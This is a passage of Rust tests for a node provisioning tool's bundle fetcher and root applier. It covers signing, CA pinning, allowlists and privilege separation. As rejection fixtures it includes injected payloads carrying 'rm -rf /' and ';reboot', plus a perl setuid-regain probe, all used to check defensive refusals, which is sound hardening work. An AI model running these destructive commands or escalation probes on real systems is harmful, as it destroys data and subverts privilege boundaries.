    /// signature. The old code turned that into `None` with openssl's stderr
    /// sent to /dev/null, so neither the node nor the controller could say
    /// what went wrong — the whole reason the live bug took a round trip to
    /// diagnose. The reason must come back out.
    #[test]
    fn an_openssl_failure_carries_opensslss_own_words() {
        let base = mac_base("badkey");
        // A file that exists and is not a key. openssl will refuse it and say
        // why; that "why" is what has to survive.
        std::fs::write(base.join("birth.key"), b"-----BEGIN PRIVATE KEY-----\nnot a key\n").unwrap(); // leak-ok: a deliberately INVALID key body; the whole point is that openssl refuses it
        let err = birth_proof(&base, "apply", "host6", &"c".repeat(64))
            .expect_err("a garbage key must not produce a proof");
        assert!(
            err.contains("openssl"),
            "the refusal must name the tool that failed, got: {err}"
        );
        assert!(
            err.contains(&base.join("birth.key").display().to_string()),
            "and the key it failed on, got: {err}"
        );
        // The load-bearing part: openssl's own diagnostic, not just an exit
        // code. Assert we captured SOMETHING it said beyond our own wrapper.
        let wrapper_len = format!(
            "`openssl dgst -sha256 -sign {}` failed (exit status: 1)",
            base.join("birth.key").display()
        ).len();
        assert!(
            err.len() > wrapper_len,
            "openssl's stderr was discarded — this is the /dev/null bug returning. got: {err}"
        );
        let _ = std::fs::remove_dir_all(&base);
    }

    /// The two pollers must sign the SAME string, or the gateway's verifier —
    /// written once — accepts one node and refuses the other. Both build it by
    /// interpolation, so the pin is on the format itself.
    ///
    /// The third copy is `birth_proof::signed_message` in the gateway, pinned
    /// by its own test. Three producers, one string.
    #[test]
    fn the_two_pollers_sign_the_same_string() {
        assert_eq!(
            birth_proof_message("fetch", "host9", "deadbeef", 1_757_000_000),
            "noo-bundle-fetch:host9:deadbeef:1757000000"
        );
        let Some(root) = scripts_dir() else { return };
        let fetch = std::fs::read_to_string(root.join("noo-fetch.sh")).expect("noo-fetch.sh");
        // The shell's printf template, spelled exactly. Asserting on a word
        // that also appears in the comment above it would pass on a script
        // that had lost the code.
        assert!(
            fetch.contains(r#"printf 'noo-bundle-%s:%s:%s:%s' "$1" "$NODE" "$2" "$_ts""#),
            "noo-fetch.sh no longer builds the birth-proof string the gateway verifies"
        );
        assert!(
            fetch.contains("openssl dgst -sha256 -sign"),
            "noo-fetch.sh must sign with RSA PKCS#1 v1.5 over SHA-256"
        );
    }

    /// Both pollers must SEND the receipt, not merely be able to build one.
    /// `fetched_at` is stamped by that POST and by nothing else once the
    /// compatibility window closes, so a poller that signs and never sends
    /// leaves `provision --wait` narrating a stage that never arrives.
    #[test]
    fn both_pollers_send_the_fetch_receipt() {
        assert!(
            std::str::from_utf8(include_bytes!("node_fetch.rs"))
                .unwrap()
                .contains("/bootstrap/bundle/{node}/fetched"),
            "the macOS poller must POST the fetch receipt"
        );
        let Some(root) = scripts_dir() else { return };
        let fetch = std::fs::read_to_string(root.join("noo-fetch.sh")).expect("noo-fetch.sh");
        assert!(
            fetch.contains("$URL/bootstrap/bundle/$NODE/fetched"),
            "noo-fetch.sh must POST the fetch receipt"
        );
        assert!(
            fetch.contains("x-noo-birth-proof:"),
            "noo-fetch.sh must present the proof header"
        );
    }

    /// Neither poller may have an unverified lane at all. The old rule was
    /// "the anchor must be tested before the `controller-insecure` marker";
    /// the marker is gone, so the rule is now the stronger one —
    /// no `-k`, no marker, and a missing anchor is a refusal.
    /// NOTE ON REACH: this reads `../scripts` at RUNTIME. It used to be
    /// inert in CI — `cargo-docker.sh` mounted only the crate directory, so
    /// the skip arm fired and nothing was asserted. The
    /// harness now mounts the repo root and `scripts_dir()` PANICS rather
    /// than skips under it, so this really runs. Assertions are
    /// against the exact CODE spelling, never a word that also appears in a
    /// comment: the first cut asserted `!fetch.contains("controller-insecure")`
    /// and would have failed on the very commit that removed the branch,
    /// because the comment explaining the removal names the marker.
    #[test]
    fn neither_poller_has_an_unverified_lane() {
        let Some(root) = scripts_dir() else { return };
        let fetch = std::fs::read_to_string(root.join("noo-fetch.sh")).expect("noo-fetch.sh");
        assert!(
            fetch.contains("$CONF_DIR/pki/ca.crt"),
            "noo-fetch.sh must pin the cluster CA"
        );
        assert!(
            !fetch.contains("$CONF_DIR/controller-insecure"),
            "noo-fetch.sh still reads the controller-insecure marker"
        );
        assert!(
            !fetch.contains("TLS=\"-k\""),
            "noo-fetch.sh still has a -k branch"
        );

        let prep = std::fs::read_to_string(root.join("prep-host.sh")).unwrap();
        assert!(
            !prep.contains("touch /etc/noo/controller-insecure"),
            "prep-host.sh still writes the controller-insecure marker"
        );
        // The old shape was two `elif [ "${PREP_INSECURE:-0}" = "1" ]` arms:
        // one that fetched root-executed tooling with -k, one that wrote the
        // marker. Both are gone. The ONE remaining -k (the CA fetch itself)
        // is a plain `if`, guarded by the pin check asserted below.
        assert!(
            !prep.contains("elif [ \"${PREP_INSECURE:-0}\" = \"1\" ]"),
            "prep-host.sh still has a PREP_INSECURE fallback arm"
        );
        // The one unverified fetch prep may make — the CA itself — must be
        // fingerprint-pinned, or it is blind TOFU.
        assert!(
            prep.contains("PREP_CA_SHA256 is required"),
            "prep-host.sh no longer REFUSES an unverified CA fetch without a pin"
        );
    }

    #[test]
    fn a_host_telemetry_payload_is_bound_to_one_node() {
        assert!(KNOWN_KINDS.contains(&"host-telemetry"));
        assert!(host_telemetry_binding("NODE=host6\n", "host6").is_ok());
        let wrong = host_telemetry_binding("NODE=host6\n", "host9").unwrap_err();
        assert!(wrong.contains("host6") && wrong.contains("host9"), "{wrong}");
        for extra in ["apply\n", "NODE=host6\nrm -rf /\n", "NODE=host6\nTS_EXTRA=1\n", "NODE=host6;reboot\n", "NODE=host6\nNODE=host6\n", "#!/bin/sh\nNODE=host6\n", ""] {
            assert!(host_telemetry_binding(extra, "host6").unwrap_err().contains("nothing but NODE="), "accepted {extra:?}");
        }
    }

    /// The three kind allowlists (noo-apply.sh, sign-bundle.sh, this file)
    /// must agree: a kind the signer emits that an applier does not know is
    /// a refused bundle in the field (exit 76), found live 2026-09-03 when
    /// sign-bundle.sh lagged noo-apply by two kinds.
    #[test]
    fn kind_allowlists_agree() {
        let Some(root) = scripts_dir() else { return };
        let list = |file: &str, var: &str| -> Option<Vec<String>> {
            let src = std::fs::read_to_string(root.join(file)).ok()?;
            let line = src.lines().find(|l| l.starts_with(&format!("{var}=\"")))?;
            let inner = line.split('"').nth(1)?;
            Some(inner.split_whitespace().map(str::to_string).collect())
        };
        let (Some(apply), Some(sign)) = (list("noo-apply.sh", "KNOWN_KINDS"), list("sign-bundle.sh", "KNOWN")) else {
            panic!("could not parse the kind allowlists out of noo-apply.sh / sign-bundle.sh");
        };
        assert_eq!(apply, sign, "noo-apply.sh KNOWN_KINDS vs sign-bundle.sh KNOWN");
        for k in &apply {
            assert!(KNOWN_KINDS.contains(&k.as_str()), "node_fetch KNOWN_KINDS lacks {k}");
        }
        // noo-apply's allowlist is a shell STRING, and the string is only
        // load-bearing because a `case` matches against it. Reading the
        // assignment proves the variable agrees; this proves the variable is
        // still the thing the script gates on, so a refactor that stops
        // consulting it cannot pass by leaving a stale literal behind.
        let apply_src = std::fs::read_to_string(root.join("noo-apply.sh")).unwrap();
        assert!(
            apply_src.contains(r#"case " $KNOWN_KINDS " in"#),
            "noo-apply.sh no longer gates on KNOWN_KINDS — this test is checking a dead string"
        );
        // Every kind must be nameable by all three. Pinned by name because
        // adding a kind in two places out of three is how this breaks, and
        // it breaks DIFFERENTLY in each (signer refuses to sign / the Linux
        // applier exits 76 mid-fleet / the macOS poller refuses the bundle).
        for k in ["applier", "nats-creds", "svc-vllm.crt", "svc-reranker.key"] {
            assert!(apply.contains(&k.to_string()), "noo-apply.sh KNOWN_KINDS lacks {k}");
            assert!(sign.contains(&k.to_string()), "sign-bundle.sh KNOWN lacks {k}");
            assert!(KNOWN_KINDS.contains(&k), "node_fetch KNOWN_KINDS lacks {k}");
        }
    }

    /// The crate-only lane (`CARGO_DOCKER_CRATE=noo-cli cargo test`) mounts
    /// the crate WITHOUT scripts/, so `kind_allowlists_agree` skips there
    /// and verifies nothing. This half needs no scripts/ and therefore
    /// always runs: whatever else drifts, this binary knows the kind.
    #[test]
    fn known_kinds_carries_the_nats_credential_kind() {
        assert!(KNOWN_KINDS.contains(&"nats-creds"));
    }

    /// Every door leaf kind the controller packs is one this applier
    /// accepts — the half of the three-way agreement that needs no scripts/.
    #[test]
    fn known_kinds_carries_every_door_leaf_kind() {
        for l in crate::commands::node_leaves::NODE_DOOR_LEAVES {
            assert!(KNOWN_KINDS.contains(&l.crt_kind), "{}", l.crt_kind);
            assert!(KNOWN_KINDS.contains(&l.key_kind), "{}", l.key_kind);
        }
    }

    #[test]
    fn service_leaves_land_under_pki_services_with_their_modes() {
        use std::os::unix::fs::PermissionsExt;
        let dir = std::env::temp_dir().join(format!("noo-mac-leaves-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let pki = dir.join("pki");
        std::fs::create_dir_all(pki.join("services/grafana")).unwrap();
        std::fs::write(pki.join("services/grafana/service.crt"), "keep me").unwrap();
        let mut payloads = Payloads::new();
        payloads.insert("svc-vllm.crt".into(), b"CRT".to_vec());
        payloads.insert("svc-vllm.key".into(), b"KEY".to_vec());
        let done = install_service_leaves(&payloads, &pki).unwrap();
        assert_eq!(done, vec!["vllm"]);
        let mode = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;
        assert_eq!(std::fs::read_to_string(pki.join("services/vllm/service.key")).unwrap(), "KEY");
        assert_eq!(mode(&pki.join("services/vllm/service.key")), 0o600);
        assert_eq!(mode(&pki.join("services/vllm/service.crt")), 0o644);
        assert_eq!(mode(&pki.join("services/vllm")), 0o755);
        assert!(!pki.join("services/vllm/.service.key.noo-next").exists(), "a temp file was left behind");
        // A leaf the bundle does not carry is not touched.
        assert_eq!(std::fs::read_to_string(pki.join("services/grafana/service.crt")).unwrap(), "keep me");
        // A half pair is refused and installs nothing.
        payloads.remove("svc-vllm.key");
        payloads.insert("svc-vllm.crt".into(), b"NEW".to_vec());
        assert!(install_service_leaves(&payloads, &pki).is_err());
        assert_eq!(std::fs::read_to_string(pki.join("services/vllm/service.crt")).unwrap(), "CRT");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The Mac's verifier accepts a bundle carrying the leaf kinds, signed
    /// the way the controller signs.
    #[test]
    fn a_bundle_carrying_door_leaves_verifies() {
        let f = fixture("leaves");
        let ca = ca_of(&f);
        ca.ensure_signing_key().unwrap();
        std::fs::copy(ca.signing_pub_path(), f.dir.join("pki/signing.pub")).unwrap();
        stage_file(&f, "svc-tei.crt", "c");
        stage_file(&f, "svc-tei.key", "k");
        sign_stage(&f, &ca.signing_key_path());
        assert!(verify(&f).is_ok(), "{:?}", verify(&f));
    }

    #[test]
    fn der_fingerprint_of_a_pem() {
        // The base64 body ("test") decodes and hashes to the known SHA-256
        // vector, as lowercase hex: this is the `--ca-sha256` pin format, so
        // it is checked against a literal, not against the same expression.
        let pem = b"-----BEGIN CERTIFICATE-----\ndGVzdA==\n-----END CERTIFICATE-----\n";
        assert_eq!(
            cert_der_sha256(pem).unwrap(),
            "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
        );
    }
}

#[cfg(test)]
mod user_writes_tests {
    //! H2: the Mac root applier
    //! writes the user's tree as the user, decides from the verified bytes
    //! only, and writes root paths only with root resumed, into directories
    //! nobody else can write.
    //!
    //! Tests named `root_only_*` need a real root: the CI root step runs
    //! exactly that filter in the Rust container with `--user 0` and
    //! `NOO_REQUIRE_ROOT_TESTS=1`, which turns their skip into a failure.
    use super::*;
    use std::os::unix::fs::{MetadataExt, PermissionsExt};

    /// Root, or a skip — and under `NOO_REQUIRE_ROOT_TESTS` a skip is a
    /// failure: the step that exists to run these must not go green
    /// having run none of them.
    fn require_root(name: &str) -> bool {
        if unsafe { libc::geteuid() } == 0 {
            return true;
        }
        assert!(
            std::env::var_os("NOO_REQUIRE_ROOT_TESTS").is_none(),
            "{name} needs root, and NOO_REQUIRE_ROOT_TESTS is set: the root test step is not running as root, \
             so the root behaviour went untested"
        );
        eprintln!("{name}: not root — skipping (the CI root step runs it with NOO_REQUIRE_ROOT_TESTS=1)");
        false
    }

    fn scratch(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!(
            "noo-h2-{name}-{}-{}",
            std::process::id(),
            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()
        ));
        std::fs::create_dir_all(&d).unwrap();
        std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o755)).unwrap();
        d
    }

    /// Run `f` in a forked child and return its exit code: the effective
    /// uid is process-wide, so a test that lowers must never lower the test
    /// runner itself.
    fn in_child(f: impl FnOnce() -> i32) -> i32 {
        let pid = unsafe { libc::fork() };
        if pid == 0 {
            let code = f();
            unsafe { libc::_exit(code) };
        }
        let mut status = 0;
        unsafe { libc::waitpid(pid, &mut status, 0) };
        libc::WEXITSTATUS(status)
    }

    #[test]
    fn root_only_dropped_the_poll_cannot_write_a_root_file_and_root_scopes_can() {
        if !require_root("root_only_dropped_the_poll_cannot_write_a_root_file_and_root_scopes_can") {
            return;
        }
        let d = scratch("victim");
        let victim = d.join("victim");
        std::fs::write(&victim, "root's").unwrap();
        std::fs::set_permissions(&victim, std::fs::Permissions::from_mode(0o644)).unwrap();
        let code = in_child(|| {
            if privs::drop_to("nobody").is_err() { return 10; }
            if std::fs::write(&victim, "user's").is_ok() { return 11; }
            {
                let _r = privs::root();
                if std::fs::write(&victim, "root again").is_err() { return 12; }
            }
            if std::fs::write(&victim, "user's").is_ok() { return 13; }
            0
        });
        let _ = std::fs::remove_dir_all(&d);
        assert_eq!(code, 0, "child failed step {code} (11: wrote a root file while lowered; 13: did not lower again after the root scope)");
    }

    /// `(real, effective, saved)` uid and CapEff of a child, from its own
    /// /proc/self/status (Linux: the CI container).
    fn child_creds(out: &std::process::Output) -> (Vec<u32>, String) {
        let text = String::from_utf8_lossy(&out.stdout);
        let uids = text
            .lines()
            .find_map(|l| l.strip_prefix("Uid:"))
            .map(|v| v.split_whitespace().take(3).filter_map(|n| n.parse().ok()).collect())
            .unwrap_or_default();
        let cap = text.lines().find_map(|l| l.strip_prefix("CapEff:")).unwrap_or("").trim().to_string();
        (uids, cap)
    }

    /// H2 third review, L6: a child spawned while merely LOWERED keeps real
    /// uid 0 and can setuid(0) back. `lowered_output` drops it wholly.
    #[test]
    fn root_only_a_lowered_child_cannot_setuid_0() {
        if !require_root("root_only_a_lowered_child_cannot_setuid_0") {
            return;
        }
        let code = in_child(|| {
            if privs::drop_to("nobody").is_err() { return 10; }
            // The control: a plain spawn while lowered keeps real uid 0 —
            // the hole. If this does not show it, the probe proves nothing.
            let Ok(plain) = Command::new("/bin/cat").arg("/proc/self/status").output() else { return 11 };
            let (uids, _) = child_creds(&plain);
            if uids.len() != 3 || uids[0] != 0 { return 12; }
            let Ok(out) = lowered_output(Command::new("/bin/cat").arg("/proc/self/status")) else { return 13 };
            let (uids, cap) = child_creds(&out);
            if uids.len() != 3 || uids.contains(&0) { return 14; }
            if cap.is_empty() || cap.chars().any(|c| c != '0') { return 15; }
            // And try it: perl's `$< = 0` is setreuid(0, …).
            if Path::new("/usr/bin/perl").is_file() {
                let Ok(o) = lowered_output(Command::new("/usr/bin/perl").args(["-e", "$< = 0; $> = 0; exit(($< == 0 || $> == 0) ? 42 : 0)"])) else { return 16 };
                if o.status.code() != Some(0) { return 17; }
            }
            0
        });
        assert_eq!(code, 0, "child failed step {code} (12: the control did not show real uid 0; 14/15: the lowered child kept a root uid or a capability; 17: it regained root)");
    }

    /// H2 third review, M3: the state dir stays root's; only its working
    /// subdirectories are the user's, and a non-directory at `spool` — a
    /// regular file, or a hardlink to a root file — is refused, not chowned.
    #[test]
    fn root_only_a_file_or_hardlink_at_spool_is_refused_not_chowned() {
        if !require_root("root_only_a_file_or_hardlink_at_spool_is_refused_not_chowned") {
            return;
        }
        let d = scratch("spool");
        let victim = d.join("root-secret");
        std::fs::write(&victim, "root's").unwrap();
        std::fs::set_permissions(&victim, std::fs::Permissions::from_mode(0o600)).unwrap();
        let nobody = 65534;
        for plant in ["hardlink", "file", "symlink"] {
            let state = d.join(format!("state-{plant}"));
            std::fs::create_dir_all(&state).unwrap();
            // As an older applier left it: the state dir itself the user's.
            std::os::unix::fs::chown(&state, Some(nobody), Some(nobody)).unwrap();
            match plant {
                "hardlink" => std::fs::hard_link(&victim, state.join("spool")).unwrap(),
                "file" => std::fs::write(state.join("spool"), "x").unwrap(),
                _ => std::os::unix::fs::symlink(&d, state.join("spool")).unwrap(),
            }
            let e = claim_agent_dirs(&state, nobody, nobody, true).expect_err(plant);
            assert!(e.contains("not a plain directory"), "{plant}: {e}");
            let v = std::fs::metadata(&victim).unwrap();
            assert_eq!((v.uid(), v.gid()), (0, 0), "{plant}: the root file was handed to the user");
            assert_eq!(std::fs::metadata(&d).unwrap().uid(), 0, "{plant}: the symlink target was chowned");
            let s = std::fs::metadata(&state).unwrap();
            assert_eq!((s.uid(), s.mode() & 0o777), (0, 0o755), "{plant}: the state dir is not root's again");
        }
        // The floor: real directories are the user's, the state dir root's.
        let state = d.join("state-ok");
        claim_agent_dirs(&state, nobody, nobody, true).unwrap();
        assert_eq!(std::fs::metadata(&state).unwrap().uid(), 0);
        for sub in AGENT_OWNED_DIRS {
            assert_eq!(std::fs::metadata(state.join(sub)).unwrap().uid(), nobody, "{sub}");
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    /// The same refusals without root (the state dir's chown is the only
    /// part that needs it).
    #[test]
    fn a_non_directory_at_spool_is_refused_and_left_alone() {
        let d = scratch("spool-user");
        let (uid, gid) = unsafe { (libc::geteuid(), libc::getegid()) };
        let state = d.join("state");
        std::fs::create_dir_all(&state).unwrap();
        std::fs::write(d.join("other"), "other's").unwrap();
        std::fs::hard_link(d.join("other"), state.join("spool")).unwrap();
        assert!(claim_agent_dirs(&state, uid, gid, false).unwrap_err().contains("not a plain directory"));
        std::fs::remove_file(state.join("spool")).unwrap();
        std::os::unix::fs::symlink(&d, state.join("spool")).unwrap();
        assert!(claim_agent_dirs(&state, uid, gid, false).unwrap_err().contains("not a plain directory"));
        std::fs::remove_file(state.join("spool")).unwrap();
        claim_agent_dirs(&state, uid, gid, false).unwrap();
        assert!(state.join("spool").is_dir() && state.join("logship").is_dir());
        let _ = std::fs::remove_dir_all(&d);
    }

    /// H2 third review, M4, with a real root: a parent that is not root's,
    /// or that is group-writable, is refused; a root 0755 one is written
    /// root:wheel with the mode asked for.
    #[test]
    fn root_only_root_install_writes_only_into_roots_own_directories() {
        if !require_root("root_only_root_install_writes_only_into_roots_own_directories") {
            return;
        }
        let d = scratch("rinst");
        let ok = d.join("ok");
        std::fs::create_dir_all(&ok).unwrap();
        std::fs::set_permissions(&ok, std::fs::Permissions::from_mode(0o755)).unwrap();
        root_install_with(b"bin", &ok.join("noo"), 0o755, &root_dir_trustworthy, true).unwrap();
        let m = std::fs::metadata(ok.join("noo")).unwrap();
        assert_eq!((m.uid(), m.gid(), m.mode() & 0o777), (0, 0, 0o755));
        let users = d.join("users");
        std::fs::create_dir_all(&users).unwrap();
        std::os::unix::fs::chown(&users, Some(65534), Some(65534)).unwrap();
        let e = root_install_with(b"bin", &users.join("noo"), 0o755, &root_dir_trustworthy, true).unwrap_err();
        assert!(e.contains("not root-owned"), "{e}");
        let gw = d.join("groupwritable");
        std::fs::create_dir_all(&gw).unwrap();
        std::fs::set_permissions(&gw, std::fs::Permissions::from_mode(0o775)).unwrap();
        assert!(root_install_with(b"bin", &gw.join("noo"), 0o755, &root_dir_trustworthy, true).is_err());
        assert!(!users.join("noo").exists() && !gw.join("noo").exists());
        let _ = std::fs::remove_dir_all(&d);
    }

    /// The owner check is injected so this runs without root: the test's
    /// own uid stands in for root's.
    #[test]
    fn root_install_refuses_a_foreign_or_group_writable_or_symlinked_parent() {
        let me = unsafe { libc::geteuid() };
        let as_me = |p: &Path| dir_trustworthy_for(p, me);
        let as_someone_else = |p: &Path| dir_trustworthy_for(p, me.wrapping_add(1));
        let d = scratch("rinst-user");
        let ok = d.join("bin");
        std::fs::create_dir_all(&ok).unwrap();
        std::fs::set_permissions(&ok, std::fs::Permissions::from_mode(0o755)).unwrap();
        root_install_with(b"v1", &ok.join("noo"), 0o700, &as_me, false).unwrap();
        assert_eq!(std::fs::read(ok.join("noo")).unwrap(), b"v1");
        assert_eq!(std::fs::metadata(ok.join("noo")).unwrap().mode() & 0o777, 0o700);
        // Not the owner's.
        let e = root_install_with(b"v2", &ok.join("noo"), 0o755, &as_someone_else, false).unwrap_err();
        assert!(e.contains("not root-owned"), "{e}");
        // Group-writable.
        std::fs::set_permissions(&ok, std::fs::Permissions::from_mode(0o775)).unwrap();
        assert!(root_install_with(b"v2", &ok.join("noo"), 0o755, &as_me, false).is_err());
        std::fs::set_permissions(&ok, std::fs::Permissions::from_mode(0o755)).unwrap();
        // A pre-planted symlink as the directory.
        let link = d.join("linkdir");
        std::os::unix::fs::symlink(&ok, &link).unwrap();
        let e = root_install_with(b"v2", &link.join("noo"), 0o755, &as_me, false).unwrap_err();
        assert!(e.contains("not a plain directory"), "{e}");
        // A writable grandparent is refused too: it could swap the parent.
        std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o777)).unwrap();
        assert!(root_install_with(b"v2", &ok.join("noo"), 0o755, &as_me, false).is_err());
        std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o755)).unwrap();
        assert_eq!(std::fs::read(ok.join("noo")).unwrap(), b"v1", "a refused install wrote anyway");
        let _ = std::fs::remove_dir_all(&d);
    }

    /// A symlink planted at the temp name or at the destination is never
    /// written through: the temp is created O_CREAT|O_EXCL|O_NOFOLLOW, and
    /// the rename replaces the link itself.
    #[test]
    fn root_install_never_writes_through_a_planted_symlink() {
        let me = unsafe { libc::geteuid() };
        let as_me = |p: &Path| dir_trustworthy_for(p, me);
        let d = scratch("rinst-link");
        let bin = d.join("bin");
        std::fs::create_dir_all(&bin).unwrap();
        let victim = d.join("victim");
        std::fs::write(&victim, "untouched").unwrap();
        std::os::unix::fs::symlink(&victim, bin.join(".noo.noo-next")).unwrap();
        std::os::unix::fs::symlink(&victim, bin.join("noo")).unwrap();
        root_install_with(b"new", &bin.join("noo"), 0o755, &as_me, false).unwrap();
        assert_eq!(std::fs::read_to_string(&victim).unwrap(), "untouched");
        assert!(!std::fs::symlink_metadata(bin.join("noo")).unwrap().file_type().is_symlink());
        assert_eq!(std::fs::read(bin.join("noo")).unwrap(), b"new");
        let _ = std::fs::remove_dir_all(&d);
    }

    fn payloads(kinds: &[(&str, &str)]) -> Payloads {
        kinds.iter().map(|(k, v)| (k.to_string(), v.as_bytes().to_vec())).collect()
    }

    #[test]
    fn the_branch_is_decided_by_the_verified_payloads() {
        use ApplyBranch::*;
        assert_eq!(apply_branch(&payloads(&[("signing-pub", "k"), ("applier", "x")])), Rollover);
        assert_eq!(apply_branch(&payloads(&[("host-telemetry", "NODE=a")])), HostTelemetry);
        assert_eq!(apply_branch(&payloads(&[("fleet-secrets", "NODE=a")])), FleetSecrets);
        assert_eq!(apply_branch(&payloads(&[("fleet-secrets", "x"), ("agent-env", "NODE_ID=a")])), Full);
        assert_eq!(apply_branch(&payloads(&[("signing-pub", "k"), ("agent-env", "NODE_ID=a")])), Full);
        assert_eq!(
            apply_branch(&payloads(&[("teardown", "host6\npurge-data\n")])),
            Teardown { names: "host6".into(), purge_data: true }
        );
        assert_eq!(
            apply_branch(&payloads(&[("teardown", "host6\n")])),
            Teardown { names: "host6".into(), purge_data: false }
        );
    }

    /// H2 third review, H1: a provisioning bundle, and a user who plants
    /// `files/teardown` (and removes `agent-env`) in the stage directory the
    /// old applier re-read after dropping root. The branch does not move,
    /// because nothing on disk is consulted — and `darwin_apply` no longer
    /// HAS a user stage to re-read.
    #[test]
    fn a_file_planted_in_a_user_stage_cannot_change_the_branch() {
        let verified = payloads(&[("agent-env", "NODE_ID=host6\n"), ("agent-binary", "bin"), ("cli-binary", "cli")]);
        let base = scratch("planted");
        let stage = base.join(format!(".apply-{}/files", std::process::id()));
        std::fs::create_dir_all(&stage).unwrap();
        std::fs::write(stage.join("teardown"), "host6\nfactory\n").unwrap();
        std::fs::write(stage.join("host-telemetry"), "NODE=host6\n").unwrap();
        std::fs::write(stage.join("signing-pub"), "attacker").unwrap();
        assert_eq!(apply_branch(&verified), ApplyBranch::Full);
        let _ = std::fs::remove_dir_all(&base);

        let all = body("darwin_apply");
        assert!(all.contains("match apply_branch(&payloads)"), "darwin_apply no longer branches on the payloads");
        // Everything after root's stage is gone works from memory.
        // (The running binary's own hash, for the re-exec decision, is not
        // a read of the bundle.)
        let f = all[all.find("drop(root_guard)").unwrap()..]
            .replace("current_exe().ok().and_then(|p| std::fs::read(p).ok())", "");
        for stage_read in [".apply-", "files.join(", "std::fs::read(", "read_to_string(", "std::fs::copy("] {
            assert!(!f.contains(stage_read), "darwin_apply reads from disk after verification again: {stage_read}");
        }
    }

    fn src() -> &'static str {
        include_str!("node_fetch.rs")
    }

    fn body(name: &str) -> &'static str {
        let s = src();
        let at = s.find(&format!("fn {name}(")).unwrap_or_else(|| panic!("fn {name} is gone"));
        let rest = &s[at..];
        &rest[..rest.find("\n}\n").unwrap()]
    }

    /// The source without its `#[cfg(test)]` modules.
    fn production() -> String {
        let mut out = String::new();
        let mut rest = src();
        while let Some(at) = rest.find("#[cfg(test)]\nmod ") {
            out.push_str(&rest[..at]);
            let tail = &rest[at..];
            rest = &tail[tail.find("\n}\n").map_or(tail.len(), |e| e + 3)..];
        }
        out.push_str(rest);
        out
    }

    /// H2 third review, L6: every child of the applier is spawned by `run`
    /// (root, cleared env), `lowered_output` (wholly the user), or one of the
    /// two deliberate root spawns in `node_fetch` (the re-exec and the
    /// teardown finisher). A new `.output()` / `.status()` / `.spawn()`
    /// anywhere else is a child that kept real uid 0 while lowered.
    #[test]
    fn no_child_is_spawned_outside_the_two_doors() {
        let prod = production();
        // An HTTP response's `.status()` is not a process.
        let count = |s: &str| {
            let s = s.replace("resp.status()", "").replace("|r| r.status()", "");
            [".output()", ".status()", ".spawn()"].iter().map(|n| s.matches(n).count()).sum::<usize>()
        };
        let allowed = [("output_text", 0), ("run", 1), ("lowered_output", 2), ("node_fetch", 2)];
        let mut seen = 0;
        for (f, want) in allowed {
            assert_eq!(count(body(f)), want, "spawns in {f}");
            seen += want;
        }
        assert_eq!(count(&prod), seen, "a child is spawned outside run / lowered_output / the two root spawns");
        // `run` gives every root child a cleared environment and a fixed PATH.
        assert!(body("run").contains(r#"env_clear().env("PATH", SAFE_PATH)"#));
        assert!(body("lowered_output").contains(".uid(uid).gid(gid)"));
    }

    /// H2 third review, M2: no bare command name, and nothing run from a
    /// Homebrew prefix as root.
    #[test]
    fn every_command_is_named_by_an_absolute_system_path() {
        let prod = production();
        for bare in [r#"Command::new("openssl")"#, r#"Command::new("launchctl")"#, r#"Command::new("chown")"#,
                     r#"Command::new("id")"#, r#"Command::new("sh")"#, r#"Command::new("sudo")"#, r#"Command::new("env")"#] {
            assert!(!prod.contains(bare), "bare command: {bare}");
        }
        for p in [OPENSSL, LAUNCHCTL, ID, SH, SUDO, ENV] {
            assert!(p.starts_with("/usr/bin/") || p.starts_with("/bin/"), "{p}");
        }
        assert!(!SAFE_PATH.contains("homebrew") && !SAFE_PATH.contains("/usr/local"));
        // tailscale from a user-owned prefix runs lowered, never as root.
        let d = body("darwin_dismantle");
        assert!(d.contains("root_exec_trustworthy(Path::new(ts))") && d.contains("lowered_output(Command::new(ts)"));
        // root runs its own CLI only after the same check.
        let f = body("node_fetch");
        assert!(f.find("root_exec_trustworthy(Path::new(NOO_ROOT_BIN))").unwrap() < f.find("Command::new(NOO_ROOT_BIN)").unwrap());
    }

    #[test]
    fn root_does_not_execute_a_user_owned_binary() {
        let d = scratch("exec");
        std::fs::write(d.join("tailscale"), "#!/bin/sh\n").unwrap();
        if unsafe { libc::geteuid() } != 0 {
            assert!(root_exec_trustworthy(&d.join("tailscale")).is_err(), "a file the user owns passed as root's");
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn the_poll_lowers_before_it_touches_the_users_tree() {
        let f = body("node_fetch");
        assert!(f.find("privs::drop_to(&user)").unwrap() < f.find("let base = PathBuf::from").unwrap());
        assert!(body("run").contains("privs::root()"), "external commands are the root half");
        // The user's files root needs are read lowered, BEFORE root resumes.
        let a = body("darwin_apply");
        let raise = a.find("let root_guard = privs::root()").unwrap();
        assert!(a.find(r#"std::fs::read(base.join("birth.key"))"#).unwrap() < raise);
        assert!(a.find("read_user_anchors(base)").unwrap() < raise);
        assert!(!a.contains(r#"base.join("node-name")"#), "node-name is read under root again");
        assert!(!body("verified_payloads").contains(r#"base.join("birth.key")"#), "root reads the user's birth.key");
        // The hostd heartbeat is polled outside any root scope.
        let h = body("install_hostd");
        let (poll, after) = (h.find("let fresh").unwrap(), h.find("if fresh").unwrap());
        assert!(!h[poll..after].contains("privs::root()"), "the heartbeat is polled as root again");
        // The one root scope before it is the `prev_bytes` block, closed.
        assert_eq!(h[..poll].matches("privs::root()").count(), 1);
        assert!(h[..poll].contains("let prev_bytes = {"));
    }

    #[test]
    fn no_root_chown_or_chmod_reaches_the_users_tree() {
        let f = body("darwin_apply");
        assert!(!f.contains(r#""-R""#), "a recursive chown is back in darwin_apply");
        assert!(!body("agent_secrets_to_files").contains("chown"));
        assert!(!production().contains(r#"lchown(d, uid, gid)"#), "the state dir is chowned to the user again");
        assert!(!production().contains("uid_of("), "the 501 fallback is back");
    }

    #[test]
    fn root_destinations_are_written_from_the_verified_bytes_with_root_resumed() {
        let f = body("darwin_apply");
        for needle in [
